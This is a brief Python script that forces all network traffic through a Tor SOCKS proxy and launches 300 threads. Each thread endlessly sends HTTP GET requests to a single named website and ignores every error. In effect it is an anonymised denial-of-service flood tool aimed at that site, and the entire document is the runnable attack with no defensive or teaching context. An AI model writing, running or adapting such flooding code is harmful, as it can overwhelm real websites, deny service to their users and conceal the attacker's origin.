import requests
import socks
import socket
import threading

def start():
    # Set up the Tor proxy
    socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
    socket.socket = socks.socksocket

    while True:
        try:
            print(requests.get("https://url.sk"))
        except:
            None

for i in range(300):

    t = threading.Thread(target=start)
    t.start()
